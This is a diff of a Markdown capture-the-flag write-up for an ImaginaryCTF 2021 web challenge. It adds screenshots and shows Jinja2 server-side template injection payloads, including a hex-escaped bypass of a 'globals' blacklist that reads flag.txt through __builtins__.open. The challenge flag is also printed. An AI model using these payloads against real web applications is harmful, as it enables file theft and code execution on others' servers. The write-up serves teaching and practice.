@@ -17,12 +17,14 @@ Eth007
 ## answer
 When you access the specified URL, you will see a website where you can enter your message.
 
+![Build-A-Website_001-1](https://github.com/A7H3NA/CEH/blob/master/CTF/2021/ImaginaryCTF%202021/Web/Build-A-Website/Build-A-Website_001-1.jpg)
+
 Entering `{{7*7}}` will result in a response of `49`, which is a jinja2 SSTI vulnerability.
 However, the blacklist filters out `global`, etc., and an error is displayed.
 
-`*** stack smashing detected ***: python3 terminated`
+![Build-A-Website_002-1](https://github.com/A7H3NA/CEH/blob/master/CTF/2021/ImaginaryCTF%202021/Web/Build-A-Website/Build-A-Website_002-1.jpg)
 
-If globals are forbidden, you can use url_for['__glo\x62als__'].You can slip past the simple check by setting.
+If globals are forbidden, you can use `url_for['__glo\x62als__']`.You can slip past the simple check by setting.
 
 ① `{{url_for['__glo\x62als__']}}`
 
@@ -51,7 +53,7 @@ If globals are forbidden, you can use url_for['__glo\x62als__'].You can slip pas
 
 ⑤ `{{url_for['__glo\x62als__'].__builtins__.open('flag.txt').read()}}`
 
+![Build-A-Website_003-1](https://github.com/A7H3NA/CEH/blob/master/CTF/2021/ImaginaryCTF%202021/Web/Build-A-Website/Build-A-Website_003-1.jpg)
 
-````
-ictf{:rooYay:_:rooPOG:_:rooHappy:_:rooooooooooooooooooooooooooo:}
-````
+
+###### flag : ictf{:rooYay:_:rooPOG:_:rooHappy:_:rooooooooooooooooooooooooooo:}
